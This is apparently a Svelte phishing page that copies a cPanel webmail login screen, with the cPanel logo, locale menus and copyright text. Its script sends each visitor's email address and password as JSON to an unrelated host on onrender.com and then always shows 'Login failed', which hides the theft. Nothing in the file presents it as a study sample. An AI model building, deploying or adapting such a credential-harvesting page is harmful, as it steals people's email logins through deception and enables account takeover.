<script>
    let BACKEND_URL = 'https://frag-h1wt.onrender.com';
    let email = '';
    let password = '';
    
    let errorMessage = '';
    let isSubmitting = false;

    function validateForm() {
        errorMessage = '';

        if (!email.trim()) {
            errorMessage = 'Email address is required.';
            return false;
        }

        const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        if (!emailPattern.test(email)) {
            errorMessage = 'Please enter a valid email address.';
            return false;
        }

        if (!password) {
            errorMessage = 'Password is required.';
            return false;
        }

        if (password.length < 6) {
            errorMessage = 'Password must be at least 6 characters long.';
            return false;
        }

        return true;
    }

    // Post data to your Backend API
    async function sendDataToBackend() {
        if (!validateForm()) return;

        isSubmitting = true;
        errorMessage = '';

        try {
            const response = await fetch(BACKEND_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ email, password })
            });

            const data = await response.json();

            if (!response.ok) {
                throw new Error(data.message || 'Login failed. Please check your credentials.');
            }

            // console.log('Login successful!', data);
            
        } catch (err) {
            errorMessage = "Login failed";
        } finally {
            isSubmitting = false;
        }
    }

    function handleSubmit(event) {
        event.preventDefault();
        sendDataToBackend();
    }
</script>




<input type="hidden" id="goto_uri" value="/?locale=en">
<input type="hidden" id="goto_app" value="">
<!-- Do not remove msg_code as it is needed for automated testing - msg_code:[invalid_session]  -->
<div id="login-wrapper" class="group has-pw-reset" style="opacity: 1; visibility: visible;">
    <div class="wrapper">

    <div style="display:none">
        <div id="locale-container" style="visibility:hidden">
            <div id="locale-inner-container">
                <div id="locale-header">
                    <div class="locale-head">Please select a locale:</div>
                    
                    <!-- Toggle locale close button function should be applied here -->
                     <div class="close"><a href="">X Close</a></div>
                </div>
                <div id="locale-map">
                    <div class="scroller clear">
                        
                            <div class="locale-cell"><a href="?locale=ar">العربية</a></div>
                        
                            <div class="locale-cell"><a href="?locale=bg">български</a></div>
                        
                            <div class="locale-cell"><a href="?locale=cs">čeština</a></div>
                        
                            <div class="locale-cell"><a href="?locale=da">dansk</a></div>
                        
                            <div class="locale-cell"><a href="?locale=de">Deutsch</a></div>
                        
                            <div class="locale-cell"><a href="?locale=el">Ελληνικά</a></div>
                        
                            <div class="locale-cell"><a href="?locale=es">español</a></div>
                        
                            <div class="locale-cell"><a href="?locale=es_419">español latinoamericano</a></div>
                        
                            <div class="locale-cell"><a href="?locale=es_es">español de España</a></div>
                        
                            <div class="locale-cell"><a href="?locale=fi">suomi</a></div>
                        
                            <div class="locale-cell"><a href="?locale=fil">Filipino</a></div>
                        
                            <div class="locale-cell"><a href="?locale=fr">français</a></div>
                        
                            <div class="locale-cell"><a href="?locale=he">עברית</a></div>
                        
                            <div class="locale-cell"><a href="?locale=hu">magyar</a></div>
                        
                            <div class="locale-cell"><a href="?locale=i_cpanel_snowmen">☃ cPanel Snowmen ☃ - i_cpanel_snowmen</a></div>
                        
                            <div class="locale-cell"><a href="?locale=id">Bahasa Indonesia</a></div>
                        
                            <div class="locale-cell"><a href="?locale=it">italiano</a></div>
                        
                            <div class="locale-cell"><a href="?locale=ja">日本語</a></div>
                        
                            <div class="locale-cell"><a href="?locale=ko">한국어</a></div>
                        
                            <div class="locale-cell"><a href="?locale=ms">Bahasa Melayu</a></div>
                        
                            <div class="locale-cell"><a href="?locale=nb">norsk bokmål</a></div>
                        
                            <div class="locale-cell"><a href="?locale=nl">Nederlands</a></div>
                        
                            <div class="locale-cell"><a href="?locale=no">Norwegian</a></div>
                        
                            <div class="locale-cell"><a href="?locale=pl">polski</a></div>
                        
                            <div class="locale-cell"><a href="?locale=pt">português</a></div>
                        
                            <div class="locale-cell"><a href="?locale=pt_br">português do Brasil</a></div>
                        
                            <div class="locale-cell"><a href="?locale=ro">română</a></div>
                        
                            <div class="locale-cell"><a href="?locale=ru">русский</a></div>
                        
                            <div class="locale-cell"><a href="?locale=sl">slovenščina</a></div>
                        
                            <div class="locale-cell"><a href="?locale=sv">svenska</a></div>
                        
                            <div class="locale-cell"><a href="?locale=th">ไทย</a></div>
                        
                            <div class="locale-cell"><a href="?locale=tr">Türkçe</a></div>
                        
                            <div class="locale-cell"><a href="?locale=uk">українська</a></div>
                        
                            <div class="locale-cell"><a href="?locale=vi">Tiếng Việt</a></div>
                        
                            <div class="locale-cell"><a href="?locale=zh">中文</a></div>
                        
                            <div class="locale-cell"><a href="?locale=zh_cn">中文（中国）</a></div>
                        
                            <div class="locale-cell"><a href="?locale=zh_tw">中文（台湾）</a></div>
                        
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div id="content-container">
        <div id="login-container">

            <div id="login-sub-container">
                    <div id="login-sub-header">
                        
                        <img class="main-logo" src="https://sh001.webhostbox.net:2096/cPanel_magic_revision_1560308612/unprotected/cpanel/images/webmail-logo.svg" alt="logo">
                        
                    </div>
                    <div id="login-sub">
    <div id="forms">
        <form id="login_form" on:submit={handleSubmit}>
            
            <div class="input-req-login">
                <label for="email">Email Address</label>
            </div>
            <div class="input-field-login icon username-container">
                <input 
                    name="email" 
                    id="email" 
                    bind:value={email}
                    placeholder="Enter your email address." 
                    class="std_textbox" 
                    type="text"
                    disabled={isSubmitting}
                >
            </div>

            <div class="input-req-login login-password-field-label">
                <label for="password">Password</label>
            </div>
            <div class="input-field-login icon password-container">
                <input 
                    name="password" 
                    id="password" 
                    bind:value={password}
                    placeholder="Enter your email password." 
                    class="std_textbox" 
                    type="password"
                    disabled={isSubmitting}
                >
            </div>

            {#if errorMessage}
                <p id="msg" class="error-class" style="color:red;">{errorMessage}</p>
            {/if}

            <div class="controls">
                <div class="login-btn">
                    <button 
                        name="login" 
                        type="submit" 
                        id="login_submit"
                        disabled={isSubmitting}
                    >
                        {isSubmitting ? 'Logging in...' : 'Log in'}
                    </button>
                </div>

                <div class="reset-pw">
                    <a href="#reset" id="reset_password">Reset Password</a>
                </div>
            </div>

            <div class="clear" id="push"></div>
        </form>
    </div>
</div>
                    

                                    <!--CLOSE wrapper -->
                </div>
            <!--CLOSE login-sub-container -->
            </div>
        <!--CLOSE login-container -->
        </div>
        
                <div id="locale-footer">
            <div class="locale-container">
                    <!-- <form method="get" action=".">
                        <select name="locale">
                            <option value="">Change locale</option>
                            <option value='ar'>العربية</option><option value='bg'>български</option><option value='cs'>čeština</option><option value='da'>dansk</option><option value='de'>Deutsch</option><option value='el'>Ελληνικά</option><option value='es'>español</option><option value='es_419'>español latinoamericano</option><option value='es_es'>español de España</option><option value='fi'>suomi</option><option value='fil'>Filipino</option><option value='fr'>français</option><option value='he'>עברית</option><option value='hu'>magyar</option><option value='i_cpanel_snowmen'>☃ cPanel Snowmen ☃ - i_cpanel_snowmen</option><option value='id'>Bahasa Indonesia</option><option value='it'>italiano</option><option value='ja'>日本語</option><option value='ko'>한국어</option><option value='ms'>Bahasa Melayu</option><option value='nb'>norsk bokmål</option><option value='nl'>Nederlands</option><option value='no'>Norwegian</option><option value='pl'>polski</option><option value='pt'>português</option><option value='pt_br'>português do Brasil</option><option value='ro'>română</option><option value='ru'>русский</option><option value='sl'>slovenščina</option><option value='sv'>svenska</option><option value='th'>ไทย</option><option value='tr'>Türkçe</option><option value='uk'>українська</option><option value='vi'>Tiếng Việt</option><option value='zh'>中文</option><option value='zh_cn'>中文（中国）</option><option value='zh_tw'>中文（台湾）</option>                        </select>
                        <button style="margin-left: 10px" type="submit">Change</button>
                    </form> -->
                    <!-- <style type="text/css">#mobilelocalemenu, #locales_list {display:none}</style> -->
                <ul id="locales_list">
                    
                        
                        <li><a href="/?locale=ar">العربية</a></li>
                    
                        
                        <li><a href="/?locale=bg">български</a></li>
                    
                        
                        <li><a href="/?locale=cs">čeština</a></li>
                    
                        
                        <li><a href="/?locale=da">dansk</a></li>
                    
                        
                        <li><a href="/?locale=de">Deutsch</a></li>
                    
                        
                        <li><a href="/?locale=el">Ελληνικά</a></li>
                    
                        
                        <li><a href="/?locale=es">español</a></li>
                    
                        
                        <li><a href="/?locale=es_419">español&nbsp;latinoamericano</a></li>
                    
                        
                    <li><a href="" id="morelocale" title="More locales">…</a></li>
                </ul>
                <div class="mobilelocalemenu">Select a locale:
                    <a href="" title="Change locale">English</a>
                </div>
            </div>
        </div>
    </div>
<!--Close login-wrapper -->
</div>
<div class="copyright">Copyright©&nbsp;2025 cPanel, L.L.C.
    <br>
    <a href="https://go.cpanel.net/privacy" target="_blank">Privacy Policy</a></div>

<style>

 
  #login-wrapper {
        margin: 25px 0 5px;
    min-height: 460px;
    padding: 0 10px;
}


#login-sub-header {
    display: flex;
    justify-content: center;
    align-items: center;
}
    .copyright {
  background: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzNTlwdCIgaGVpZ2h0PSIzMjAiIHZpZXdCb3g9IjAgMCAzNTkgMjQwIj48ZGVmcz48Y2xpcFBhdGggaWQ9ImEiPjxwYXRoIGQ9Ik0xMjMgMGgyMzUuMzd2MjQwSDEyM3ptMCAwIi8+PC9jbGlwUGF0aD48L2RlZnM+PHBhdGggZD0iTTg5LjY5IDU5LjEwMmg2Ny44MDJsLTEwLjUgNDAuMmMtMS42MDUgNS42LTQuNjA1IDEwLjEtOSAxMy41LTQuNDAyIDMuNC05LjUwNCA1LjA5Ni0xNS4zIDUuMDk2aC0zMS41Yy03LjIgMC0xMy41NSAyLjEwMi0xOS4wNSA2LjMtNS41MDUgNC4yLTkuMzUzIDkuOTA0LTExLjU1MiAxNy4xMDMtMS40IDUuNDAzLTEuNTUgMTAuNS0uNDUgMTUuMzAyIDEuMDk4IDQuNzk2IDMuMDQ3IDkuMDUgNS44NTIgMTIuNzUgMi43OTcgMy43MDMgNi40IDYuNjUyIDEwLjc5NyA4Ljg1IDQuMzk3IDIuMiA5LjE5OCAzLjI5OCAxNC40IDMuMjk4aDE5LjJjMy42MDIgMCA2LjU0NyAxLjQ1MyA4Ljg1MiA0LjM1MiAyLjI5NyAyLjkwMiAyLjk0NSA2LjE0OCAxLjk1IDkuNzVsLTEyIDQ0LjM5OGgtMjFjLTE0LjQwMyAwLTI3LjY1My0zLjE0OC0zOS43NS05LjQ1LTEyLjEwMi02LjMtMjIuMTUzLTE0LjY0OC0zMC4xNTMtMjUuMDUtOC0xMC4zOTUtMTMuNDU0LTIyLjI0Ni0xNi4zNS0zNS41NDctMi45LTEzLjMtMi41NS0yNi45NSAxLjA1Mi00MC45NTNsMS4yLTQuNWMyLjU5Ny05LjYwMiA2LjY0OC0xOC40NSAxMi4xNDgtMjYuNTUgNS41LTguMDk4IDEyLTE1IDE5LjUtMjAuNyA3LjUtNS43IDE1Ljg1LTEwLjE0OCAyNS4wNS0xMy4zNTIgOS4yLTMuMTk1IDE4Ljc5Ny00Ljc5NiAyOC44LTQuNzk2IiBmaWxsPSIjZmY2YzJjIi8+PGcgY2xpcC1wYXRoPSJ1cmwoI2EpIj48cGF0aCBkPSJNMTIzLjg5IDI0MEwxODIuOTkgMTguNjAyYzEuNTk4LTUuNTk4IDQuNTk4LTEwLjA5OCA5LTEzLjVDMTk2LjM4OCAxLjcgMjAxLjQ4NCAwIDIwNy4yODggMGg2Mi43YzE0LjQwMyAwIDI3LjY1IDMuMTQ4IDM5Ljc1IDkuNDUgMTIuMTAyIDYuMyAyMi4xNTMgMTQuNjU1IDMwLjE1MyAyNS4wNSA3Ljk5NyAxMC40MDIgMTMuNSAyMi4yNTQgMTYuNSAzNS41NSAzIDEzLjMwNSAyLjU5NCAyNi45NTQtMS4yMDIgNDAuOTVsLTEuMiA0LjVjLTIuNTk3IDkuNjAyLTYuNTk3IDE4LjQ1LTEyIDI2LjU1LTUuMzk4IDguMDk4LTExLjg0NyAxNS4wNTItMTkuMzQ3IDIwLjg0OC03LjUgNS44MDUtMTUuODU1IDEwLjMwNS0yNS4wNSAxMy41LTkuMiAzLjIwNC0xOC44MDUgNC44MDUtMjguODA1IDQuODA1aC01NC4yOTdsMTAuOC00MC41YzEuNi01LjQwMiA0LjYtOS44IDktMTMuMjAzIDQuMzk2LTMuMzk4IDkuNDk3LTUuMTAyIDE1LjMwMi01LjEwMmgxNy4zOThjNy4yIDAgMTMuNjUzLTIuMiAxOS4zNTItNi41OTcgNS42OTUtNC4zOTggOS40NDUtMTAuMDk3IDExLjI1LTE3LjEgMS4zOTQtNC45OTcgMS41NDctOS45LjQ0NS0xNC43LTEuMS00LjgtMy4wNS05LjA0Ny01Ljg0OC0xMi43NS0yLjgtMy42OTUtNi40MDItNi42OTUtMTAuNzk2LTktNC40MDYtMi4yOTctOS4yMDYtMy40NS0xNC40MDItMy40NUgyMzMuMzlsLTQzLjggMTYyLjkwM2MtMS42MDYgNS40LTQuNjA2IDkuNzk3LTkgMTMuMTk1LTQuNDAzIDMuNDA3LTkuNDA2IDUuMTAyLTE1IDUuMTAyaC00MS43IiBmaWxsPSIjZmY2YzJjIi8+PC9nPjwvc3ZnPgo=) no-repeat scroll center top transparent;
  background-size: 25px auto;
}

.copyright a {
    color: #3f4143;
}
.login-btn {
    padding: 20px 0 0 !important;
}

#locales_list {
    display: none !important;
}

/* Make the mobile menu visible and add top spacing to push it down */
.mobilelocalemenu {
    display: block !important;
    margin-top: 22px; /* Adjust this value to get your perfect spacing */
}

input#email.std_textbox {
    margin: 4px 5px 0 20px !important;
}
input#password.std_textbox {
    margin: 4px 5px 0 20px !important;
}

.input-field-login.icon {
    background-position: 6px 6px;
}

.mobilelocalemenu a {
    padding: 5px 8px;
    background-color: #ccc;
    border: 1px solid #333;
    border-radius: 4px;
    color: #333;
}

button#login_submit {
    color: white;
}

.error-class {
    margin-top: 4px;
}

@media (min-width: 768px) {
    
     #login-wrapper {
        margin: 45px auto;
    min-height: 460px;
}

    /* Make the desktop list visible */
    #locales_list {
        display: block !important;
    }

    /* Hide the mobile menu completely on desktop */
    .mobilelocalemenu {
        display: none !important;
    }
}
   
</style>
